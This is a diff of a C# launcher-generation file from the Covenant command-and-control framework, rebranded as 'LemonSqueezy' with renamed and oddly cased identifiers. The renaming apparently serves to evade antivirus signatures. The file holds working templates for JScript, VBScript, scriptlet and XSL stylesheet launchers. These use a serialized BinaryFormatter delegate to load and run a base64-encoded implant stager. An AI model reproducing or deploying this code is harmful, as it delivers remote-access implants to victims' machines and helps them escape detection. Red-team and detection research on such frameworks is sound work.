@@ -1,5 +1,5 @@
 ﻿// Author: Ryan Cobb (@cobbr_io)
-// Project: Covenant (https://github.com/cobbr/Covenant)
+// Project: LemonSqueezy (https://github.com/cobbr/LemonSqueezy)
 // License: GNU GPLv3
 
 using System;
@@ -11,11 +11,11 @@ using System.ComponentModel.DataAnnotations.Schema;
 using Newtonsoft.Json;
 using Microsoft.CodeAnalysis;
 
-using Covenant.Core;
-using Covenant.Models.Grunts;
-using Covenant.Models.Listeners;
+using LemonSqueezy.Core;
+using LemonSqueezy.Models.Mofos;
+using LemonSqueezy.Models.Listeners;
 
-namespace Covenant.Models.Launchers
+namespace LemonSqueezy.Models.Launchers
 {
     public enum LauncherType
     {
@@ -47,15 +47,15 @@ namespace Covenant.Models.Launchers
         public Compiler.RuntimeIdentifier RuntimeIdentifier { get; set; } = Compiler.RuntimeIdentifier.win_x64;
 
         // Http Options
-        public bool ValidateCert { get; set; } = false;
-        public bool UseCertPinning { get; set; } = false;
+        public bool ValCerT { get; set; } = false;
+        public bool UsCertPin { get; set; } = false;
 
         // Smb Options
-        public string SMBPipeName { get; set; } = "gruntsvc";
+        public string SMBPipeName { get; set; } = "mofosvc";
 
         public int Delay { get; set; } = 5;
-        public int JitterPercent { get; set; } = 10;
-        public int ConnectAttempts { get; set; } = 5000;
+        public int JItterPercent { get; set; } = 10;
+        public int ConneCTAttEmpts { get; set; } = 5000;
         public DateTime KillDate { get; set; } = DateTime.Now.AddDays(30);
         public string LauncherString { get; set; } = "";
         public string StagerCode { get; set; } = "";
@@ -67,7 +67,7 @@ namespace Covenant.Models.Launchers
             {
                 try
                 {
-                    return Convert.ToBase64String(System.IO.File.ReadAllBytes(Common.CovenantLauncherDirectory + Name));
+                    return Convert.ToBase64String(System.IO.File.ReadAllBytes(Common.LemonSqueezyLauncherDirectory + Name));
                 }
                 catch
                 {
@@ -76,11 +76,11 @@ namespace Covenant.Models.Launchers
             }
             set
             {
-                System.IO.File.WriteAllBytes(Common.CovenantLauncherDirectory + Name, Convert.FromBase64String(value)); 
+                System.IO.File.WriteAllBytes(Common.LemonSqueezyLauncherDirectory + Name, Convert.FromBase64String(value)); 
             }
         }
 
-        public virtual string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template) { return ""; }
+        public virtual string GetLauncher(string StagerCode, byte[] StagerAssembly, Mofo mofo, ImplantTemplate template) { return ""; }
         public virtual string GetHostedLauncher(Listener listener, HostedFile hostedFile) { return ""; }
 
         public OutputKind OutputKind { get; set; } = OutputKind.DynamicallyLinkedLibrary;
@@ -113,7 +113,7 @@ namespace Covenant.Models.Launchers
 
         protected ScriptletType ScriptType { get; set; } = ScriptletType.Scriptlet;
 
-        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
+        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Mofo mofo, ImplantTemplate template)
         {
             this.StagerCode = StagerCode;
             this.Base64ILByteString = Convert.ToBase64String(StagerAssembly);
@@ -139,13 +139,13 @@ namespace Covenant.Models.Launchers
             if (this.ScriptLanguage == ScriptingLanguage.JScript)
             {
 				string DelegateBlock = String.Join("\"+\r\n\"", splitString.ToArray());
-				code = JScriptTemplate.Replace(Environment.NewLine, "\r\n").Replace("{{REPLACE_GRUNT_IL_BYTE_STRING}}", DelegateBlock);
+				code = JScriptTemplate.Replace(Environment.NewLine, "\r\n").Replace("{{REP_MOFO_IL_BYTE_STRING}}", DelegateBlock);
                 language = "JScript";
             }
             else if(this.ScriptLanguage == ScriptingLanguage.VBScript)
             {
 				string DelegateBlock = String.Join("\"\r\ns = s & \"", splitString.ToArray());
-				code = VBScriptTemplate.Replace(Environment.NewLine, "\r\n").Replace("{{REPLACE_GRUNT_IL_BYTE_STRING}}", DelegateBlock);
+				code = VBScriptTemplate.Replace(Environment.NewLine, "\r\n").Replace("{{REP_MOFO_IL_BYTE_STRING}}", DelegateBlock);
                 if (this.ScriptType == ScriptletType.Stylesheet)
                 {
                     code = "<![CDATA[\r\n" + code + "\r\n]]>";
@@ -159,30 +159,30 @@ namespace Covenant.Models.Launchers
             }
             else if (this.ScriptType == ScriptletType.Scriptlet || this.ScriptType == ScriptletType.TaggedScript)
             {
-				string TaggedScript = TaggedScriptTemplate.Replace(Environment.NewLine, "\r\n").Replace("{{REPLACE_SCRIPT_LANGUAGE}}", language);
-				TaggedScript = TaggedScript.Replace("{{REPLACE_SCRIPT}}", code);
+				string TaggedScript = TaggedScriptTemplate.Replace(Environment.NewLine, "\r\n").Replace("{{REP_SCRIPT_LANGUAGE}}", language);
+				TaggedScript = TaggedScript.Replace("{{REP_SCRIPT}}", code);
                 if (this.ScriptType == ScriptletType.TaggedScript)
                 {
                     this.DiskCode = TaggedScript;
                 }
                 else
                 {
-                    this.DiskCode = ScriptletCodeTemplate.Replace(Environment.NewLine, "\r\n").Replace("{{REPLACE_TAGGED_SCRIPT}}", TaggedScript).Replace("{{REPLACE_PROGID}}", this.ProgId);
+                    this.DiskCode = ScriptletCodeTemplate.Replace(Environment.NewLine, "\r\n").Replace("{{REP_TAGGED_SCRIPT}}", TaggedScript).Replace("{{REP_PROGID}}", this.ProgId);
                 }
             }
             else if (this.ScriptType == ScriptletType.Stylesheet)
             {
-				this.DiskCode = StylesheetCodeTemplate.Replace(Environment.NewLine, "\r\n").Replace("{{REPLACE_SCRIPT_LANGUAGE}}", language);
-                this.DiskCode = DiskCode.Replace("{{REPLACE_SCRIPT}}", code);
+				this.DiskCode = StylesheetCodeTemplate.Replace(Environment.NewLine, "\r\n").Replace("{{REP_SCRIPT_LANGUAGE}}", language);
+                this.DiskCode = DiskCode.Replace("{{REP_SCRIPT}}", code);
             }
 
             if (this.DotNetVersion == Common.DotNetVersion.Net35)
             {
-                this.DiskCode = this.DiskCode.Replace("{{REPLACE_VERSION_SETTER}}", "");
+                this.DiskCode = this.DiskCode.Replace("{{REP_VERSION_SETTER}}", "");
             }
             else if (this.DotNetVersion == Common.DotNetVersion.Net40)
             {
-                this.DiskCode = this.DiskCode.Replace("{{REPLACE_VERSION_SETTER}}", JScriptNet40VersionSetter);
+                this.DiskCode = this.DiskCode.Replace("{{REP_VERSION_SETTER}}", JScriptNet40VersionSetter);
             }
             return GetLauncher();
         }
@@ -195,19 +195,19 @@ namespace Covenant.Models.Launchers
         protected static string EndBinaryFormattedDelegate = "BAQAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQsAAAAJBwAAAAkKAAAABhAAAAAvU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkgTG9hZChCeXRlW10sIEJ5dGVbXSkGEQAAAD1TeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSBMb2FkKFN5c3RlbS5CeXRlW10sIFN5c3RlbS5CeXRlW10pCAAAAAoBBQAAAAQAAAAGEgAAAAhUb1N0cmluZwkHAAAABhQAAAAOU3lzdGVtLkNvbnZlcnQGFQAAACVTeXN0ZW0uU3RyaW5nIFRvU3RyaW5nKFN5c3RlbS5PYmplY3QpBhYAAAAlU3lzdGVtLlN0cmluZyBUb1N0cmluZyhTeXN0ZW0uT2JqZWN0KQgAAAAKAQwAAAACAAAABhcAAAAvU3lzdGVtLlJ1bnRpbWUuUmVtb3RpbmcuTWVzc2FnaW5nLkhlYWRlckhhbmRsZXIJBwAAAAoJBwAAAAkUAAAACRIAAAAKCw==";
 
         protected static String TaggedScriptTemplate =
-@"<script language=""{{REPLACE_SCRIPT_LANGUAGE}}"">
-{{REPLACE_SCRIPT}}
+@"<script language=""{{REP_SCRIPT_LANGUAGE}}"">
+{{REP_SCRIPT}}
 </script>";
         protected static String ScriptletCodeTemplate =
 @"<scriptlet>
-    <registration progid=""{{REPLACE_PROGID}}"">
-        {{REPLACE_TAGGED_SCRIPT}}
+    <registration progid=""{{REP_PROGID}}"">
+        {{REP_TAGGED_SCRIPT}}
     </registration>
 </scriptlet>";
         private static String StylesheetCodeTemplate =
 @"<stylesheet xmlns=""http://www.w3.org/1999/XSL/Transform"" xmlns:ms=""urn:schemas-microsoft-com:xslt"" xmlns:user=""blah"" version=""1.0"">
-    <ms:script implements-prefix=""user"" language=""{{REPLACE_SCRIPT_LANGUAGE}}"">
-{{REPLACE_SCRIPT}}
+    <ms:script implements-prefix=""user"" language=""{{REP_SCRIPT_LANGUAGE}}"">
+{{REP_SCRIPT}}
     </ms:script>
 </stylesheet>";
         protected static String JScriptTemplate =
@@ -223,14 +223,14 @@ namespace Covenant.Models.Launchers
     return stream;
 }
 
-{{REPLACE_VERSION_SETTER}}
-var assembly_str = ""{{REPLACE_GRUNT_IL_BYTE_STRING}}"";
+{{REP_VERSION_SETTER}}
+var assembly_str = ""{{REP_MOFO_IL_BYTE_STRING}}"";
 var stream = toStream(assembly_str);
 var formatter = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
 var array = new ActiveXObject('System.Collections.ArrayList');
 var delegate = formatter.Deserialize_2(stream);
 array.Add(undefined);
-var o = delegate.DynamicInvoke(array.ToArray()).CreateInstance('Grunt.GruntStager');";
+var o = delegate.DynamicInvoke(array.ToArray()).CreateInstance('Mofo.MofoStager');";
         protected static string JScriptNet40VersionSetter =
 @"var s = new ActiveXObject('Wscript.Shell');
 s.Environment('Process')('COMPLUS_Version') = 'v4.0.30319';";
@@ -247,9 +247,9 @@ s.Environment('Process')('COMPLUS_Version') = 'v4.0.30319';";
   Set Base64ToStream = stream
 End Function
 
-{{REPLACE_VERSION_SETTER}}
+{{REP_VERSION_SETTER}}
 Dim s
-s = ""{{REPLACE_GRUNT_IL_BYTE_STRING}}""
+s = ""{{REP_MOFO_IL_BYTE_STRING}}""
 
 Dim formatter, array, delegate, output
 Set formatter = CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
@@ -257,7 +257,7 @@ Set array = CreateObject(""System.Collections.ArrayList"")
 array.Add Empty
 
 Set delegate = formatter.Deserialize_2(Base64ToStream(s))
-Set output = delegate.DynamicInvoke(array.ToArray()).CreateInstance(""Grunt.GruntStager"")";
+Set output = delegate.DynamicInvoke(array.ToArray()).CreateInstance(""Mofo.MofoStager"")";
         protected static String VBScriptNet40VersionSetter =
 @"Dim shell, ver
   Set shell = CreateObject(""WScript.Shell"")
